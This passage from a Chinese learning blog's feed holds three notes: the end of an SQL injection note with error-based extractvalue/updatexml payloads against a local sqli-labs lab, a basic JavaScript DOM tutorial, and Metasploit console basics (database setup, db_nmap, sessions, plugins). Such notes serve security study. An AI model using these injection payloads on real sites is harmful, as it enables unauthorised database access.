<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200803184600561.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>2. 读取数据库<br>URL地址<code>http://192.168.0.104/Less-5/?id=1 &#39;and(select extractvalue(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata),0x7e)))  --+</code><br>他只能读取几个可以用<code>LIMIT</code>进行一个一个查询</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200803185528759.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>读取更多信息查看<a href="https://blog.csdn.net/qq_41860876/article/details/107694026">2. 网易web安全渗透 union联合查询注入</a></p>
<h3 id="UpdateXML-函数和extractvalue-函数一样就不多解释了"><a href="#UpdateXML-函数和extractvalue-函数一样就不多解释了" class="headerlink" title="UpdateXML()函数和extractvalue()函数一样就不多解释了"></a>UpdateXML()函数和extractvalue()函数一样就不多解释了</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.0.104&#x2F;Less-5&#x2F;?id&#x3D;1 &#39; and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)</span><br></pre></td></tr></table></figure>






















]]></content>
      <categories>
        <category>web安全</category>
        <category>sql注入</category>
      </categories>
      <tags>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>3.JavaScript的DOM使用</title>
    <url>/2020/12/04/3.JavaScriptDOM%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><p>在使用 JavaScript 编写 Web 代码时，有许多 Web API 可供调用。下面是开发Web应用程序或网站时可能使用的所有API和接口（对象类型）的列表。</p>
<p>官方文档[<a href="https://developer.mozilla.org/zh-CN/docs/Web/api][https://developer.mozilla.org/zh-CN/docs/Web/api]">https://developer.mozilla.org/zh-CN/docs/Web/api][https://developer.mozilla.org/zh-CN/docs/Web/api]</a></p>
<h2 id="DOM介绍"><a href="#DOM介绍" class="headerlink" title="DOM介绍"></a>DOM介绍</h2><p>比如<code>a.htm</code>l这个<code>a.html</code>就是一个文档对象<br>下面这个是文档对象的模型<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201130160523.png"></p>
<p><code>document</code>对象就代表整个网页的对象</p>
<h2 id="document基本使用"><a href="#document基本使用" class="headerlink" title="document基本使用"></a><code>document</code>基本使用</h2><p><code>document</code>对象使我们可以从脚本中对 HTML 页面中的所有元素进行访问<br><code>document</code>他是一个全局属性，在一个web页面里面那个地址都可以访问他<br>比如</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;a&quot;</span>&gt;</span>你好啊<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>在js里面怎么调用他<br>用<code>document</code>的<code>getElementById</code>的方法</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">&quot;id的值&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>全部代码</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;a&quot;</span>&gt;</span>你好啊<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> a = <span class="built_in">document</span>.getElementById(<span class="string">&quot;a&quot;</span>)</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(a);</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201130161715.png"><br>下面有详细的介绍</p>
<h2 id="事件"><a href="#事件" class="headerlink" title="事件"></a>事件</h2><p>代码<br>下面代码的意思<code>&lt;button&gt;</code>创建一个按钮里面有个一个id属性<br>然后用<code>document</code>的<code>getElementById</code>的方法调用id赋值给a<br>a添加onclick属性<br>onclick被触发的时候调用function函数</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;a&quot;</span>&gt;</span>点我<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">	<span class="comment">//通过id调用</span></span></span><br><span class="line"><span class="javascript">	<span class="keyword">var</span> a = <span class="built_in">document</span>.getElementById(<span class="string">&quot;a&quot;</span>);</span></span><br><span class="line">	</span><br><span class="line"><span class="javascript">	<span class="comment">//onclick被触发的时候调用function函数</span></span></span><br><span class="line"><span class="javascript">	a.onclick=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">		alert(<span class="string">&quot;你好啊&quot;</span>)</span></span><br><span class="line">	&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201202165612.png"></p>
<h2 id="Document-的对象方法"><a href="#Document-的对象方法" class="headerlink" title="Document 的对象方法"></a>Document 的对象方法</h2><table>
<thead>
<tr>
<th align="center">方法</th>
<th align="right">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>getElementById()</code></td>
<td align="right">返回对拥有指定 id 的第一个对象的引用</td>
</tr>
<tr>
<td align="center"><code>getElementsByTagName()</code></td>
<td align="right">通过标签名获得一组元素点对象</td>
</tr>
<tr>
<td align="center"><code>getElementsByName()</code></td>
<td align="right">通过name属性获得一组元素对象</td>
</tr>
<tr>
<td align="center"><code>close()</code></td>
<td align="right">关闭用 document.open() 方法打开的输出流，并显示选定的数据</td>
</tr>
<tr>
<td align="center"><code>open()</code></td>
<td align="right">打开一个流，以收集来自任何 document.write() 或 document.writeln() 方法的输出。</td>
</tr>
<tr>
<td align="center"><code>write()</code></td>
<td align="right">向文档写 HTML 表达式 或 JavaScript 代码</td>
</tr>
<tr>
<td align="center"><code>writeln()</code></td>
<td align="right">等同于 write() 方法，不同的是在每个表达式之后写一个换行符</td>
</tr>
</tbody></table>
<p>下面我就演示几个</p>
<h3 id="document的getElementById方法"><a href="#document的getElementById方法" class="headerlink" title="document的getElementById方法"></a>document的getElementById方法</h3><p><code>getElementById()</code> 方法可返回对拥有指定 ID 的第一个对象的引用<br>语法</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">&quot;id的值&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>实咧<br>下面p标签里面的一个id属性值是a我们可以用<code>getElementById()</code> 来获取p标签</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--主要代码在这里--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;a&quot;</span>&gt;</span>你好啊<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> a = <span class="built_in">document</span>.getElementById(<span class="string">&quot;a&quot;</span>)</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(a);</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201130161715.png"></p>
<p><strong>如果我们想查看里面和修改我们就可以用</strong><br><code>document</code>的<code>getElementById</code>方法的</p>
<p>代码</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--主要代码在这里--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;a&quot;</span>&gt;</span>你好啊<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> a = <span class="built_in">document</span>.getElementById(<span class="string">&quot;a&quot;</span>);</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(a.innerHTML);</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>结果<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201130163817.png"><br>如果我们想修改他很简单</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;a&quot;</span>&gt;</span>你好啊<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> a = <span class="built_in">document</span>.getElementById(<span class="string">&quot;a&quot;</span>);</span></span><br><span class="line"><span class="javascript">        <span class="comment">//主要代码在这里</span></span></span><br><span class="line"><span class="javascript">    	a.innerHTML=<span class="string">&quot;不好&quot;</span>;</span></span><br><span class="line"><span class="javascript">    	<span class="built_in">console</span>.log(a);</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>结果<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201130164034.png"></p>
<h3 id="document的getElementsByTagName-方法"><a href="#document的getElementsByTagName-方法" class="headerlink" title="document的getElementsByTagName()方法"></a>document的getElementsByTagName()方法</h3><p>getElementsByTagName()通过标签名获得一组元素点对象<br>下面这个h1就是标签名<br>我们就可以用getElementsByTagName()来获取他<code>getElementsByTagName(&quot;h1&quot;)</code></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>1<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>咧<br>下面应为他获取到的是一个数组</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>111<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>222<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>333<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>444<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>555<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>666<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">	<span class="keyword">var</span> a = <span class="built_in">document</span>.getElementsByTagName(<span class="string">&quot;h1&quot;</span>);</span></span><br><span class="line">	</span><br><span class="line"><span class="javascript">	<span class="comment">//应为他获取出来的是数组</span></span></span><br><span class="line"><span class="javascript">	<span class="built_in">console</span>.log(a[<span class="number">0</span>]);</span></span><br><span class="line">	</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201202171620.png"></p>
<h3 id="document的getElementsByName-方法"><a href="#document的getElementsByName-方法" class="headerlink" title="document的getElementsByName()方法"></a>document的getElementsByName()方法</h3><p>getElementsByName() 方法可返回带有指定名称的对象的集合<br>该方法与 getElementById() 方法相似，但是它查询元素的 name 属性，而不是 id 属性。</p>
<p>咧</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">--&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;a&quot;</span> <span class="attr">value</span>=<span class="string">&quot;admin&quot;</span> &gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;a&quot;</span>  <span class="attr">value</span>=<span class="string">&quot;passwd&quot;</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">	<span class="keyword">var</span> a = <span class="built_in">document</span>.getElementsByName(<span class="string">&quot;a&quot;</span>);</span></span><br><span class="line">	</span><br><span class="line"><span class="javascript">	<span class="comment">//输出来的是数组</span></span></span><br><span class="line"><span class="javascript">	<span class="built_in">console</span>.log(a);</span></span><br><span class="line"><span class="javascript">	<span class="comment">//应为他获取出来的是数组，要是行查询里面的属性，添加.属性名</span></span></span><br><span class="line"><span class="javascript">	<span class="built_in">console</span>.log(a[<span class="number">0</span>].value);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201202173812.png"></p>
]]></content>
      <categories>
        <category>编程</category>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>编程</tag>
      </tags>
  </entry>
  <entry>
    <title>3.Metasploit使用</title>
    <url>/2020/08/09/3.Metasploit%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><h2 id="去年学的都忘了掉了没有写笔记"><a href="#去年学的都忘了掉了没有写笔记" class="headerlink" title="去年学的都忘了掉了没有写笔记"></a>去年学的都忘了掉了没有写笔记</h2><h2 id="再学Metasploit学习笔记，"><a href="#再学Metasploit学习笔记，" class="headerlink" title="再学Metasploit学习笔记，"></a>再学Metasploit学习笔记，</h2><p><strong>我启动msf后出现的问题</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;20-04-09 16:35&#125;kali:~ kali% sudo msfconsole</span><br><span class="line">[sudo] kali 的密码：</span><br><span class="line">[-] ***rting the Metasploit Framework console...|</span><br><span class="line">[-] * WARNING: No database support: No database YAML file</span><br><span class="line">[-] ***</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200409163737511.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_emhhb19zZV9haS5naXRlZS5pbw==,size_20,color_006400,t_70" alt="在这里插入图片描述"><br>查看数据库没有连接</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf5 &gt; db_status </span><br><span class="line">[*] postgresql selected, no connection  </span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200409163429205.png" alt="在这里插入图片描述"><br><strong>解决这个问题初始化一下数据库就可以了</strong><br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfdb init</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200409163842413.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_emhhb19zZV9haS5naXRlZS5pbw==,size_20,color_006400,t_70" alt="在这里插入图片描述"><br>然后重启一下msf就可以了<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200409164200944.png" alt="在这里插入图片描述"><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200409164225902.png" alt="在这里插入图片描述"></p>
<h1 id="开始正式的笔记"><a href="#开始正式的笔记" class="headerlink" title="开始正式的笔记"></a>开始正式的笔记</h1><h3 id="命令介绍"><a href="#命令介绍" class="headerlink" title="命令介绍"></a>命令介绍</h3><ol>
<li>db命令介绍<br>db按Tab键查看<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200409164916507.png" alt="在这里插入图片描述"></li>
<li><strong>db_status</strong>：查看是否连接到数据库</li>
<li><strong>db_disconnect</strong>：断开连接数据库</li>
<li><strong>db_connect</strong>：连接，可以用-h命令查看使用<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200409170622902.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
<li><strong>db_nmap</strong>：这个和在命令行nmap一样，这个就是扫描的结果会保持到数据库里面<br>扫描一下<code>db_nmap 192.168.0.1</code><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200409171244194.png" alt="在这里插入图片描述"></li>
</ol>
<p><strong>4.1</strong> 用<code>hosts</code>命令查看存储的IP，<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200409171827349.png" alt="在这里插入图片描述"><br>只指定要查看的目标可以这样<code>hosts   目标IP</code><br><code>hosts</code> 的-S参数要只查看带目标带什么特征字的，比如列搜索带.0.的<code>hosts  -S .0.</code><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200409172509644.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以用<code>-h</code>查看使用参数<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200409172718175.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>4.2</strong> 查看扫描查看的IP命令<code>services</code><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/2020040917280366.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><code>services</code>这个命令也可以过滤和<code>hosts</code> 差不多<br><strong>列只查看开80的</strong><br><code>services -p 80</code><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200409173038209.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><code>services</code>也可以用<code>-h</code>查看他的参数<br><code>services -h</code><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200409173209556.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>5. 数据库导入导出<br><strong>导出命令<code>db_export</code></strong></p>
<pre><code><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">db_export -f  指定的文件格式   文件名</span><br></pre></td></tr></table></figure>

列
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">db_export -f  xml  &#x2F;root&#x2F;msfbak.xml</span><br></pre></td></tr></table></figure></code></pre>
<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200412185035426.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>    <strong>导入命令<code>db_import</code></strong><br>    使用</p>
<pre><code><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">db_import   要导入的文件</span><br></pre></td></tr></table></figure></code></pre>
<h2 id="常用的命令"><a href="#常用的命令" class="headerlink" title="常用的命令"></a>常用的命令</h2><p>上面都是关于数据库的命令</p>
<ol>
<li>执行命令<code>run</code>和<code>exploit</code>命令**<br> run和exploit差不多<br> 1.1run就不用说了都知道<br> 1.2<code>exploit</code>命令加上-h隐藏连接<br>发现没有连接shell<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/2020041220440751.png" alt="在这里插入图片描述"><br> <code>sessions -l</code>用这个命令就可以查看有多少已经成功拿到shell的<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200412204830249.png" alt="在这里插入图片描述"><br> 进入shell用这个命令<code>sessions -i  要进入的id名</code><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200412205004728.png" alt="在这里插入图片描述"></li>
</ol>
<ol start="2">
<li>设置模块的参数<br><code>set</code>设置模块的参数<br><code>unset</code>清除设置模块的参数</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">unset   要取消的参数名字</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200412190012718.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><code>setg</code>设置全局模块的参数<br><code>unsetg</code> 清除全局设置</p>
<h2 id="调用插件"><a href="#调用插件" class="headerlink" title="调用插件"></a>调用插件</h2><ol>
<li><p>导入<br><code>load</code>命令<br>输入完这个命令可以按Tab键查看可以使用的插件<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/2020041419353480.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>叫<code>openvas</code>模块给导入进来<br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">load openvas</span><br></pre></td></tr></table></figure>
<p>他这个只是连接openvas这个工具，都是这个openvas还是要下载好才能连接的<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200415212807743.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>还有很多这个就不演示一个一个导入模块了</p>
</li>
<li><p>导入完成后取消掉</p>
</li>
</ol>
<p>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">unload openvas</span><br></pre></td></tr></table></figure>
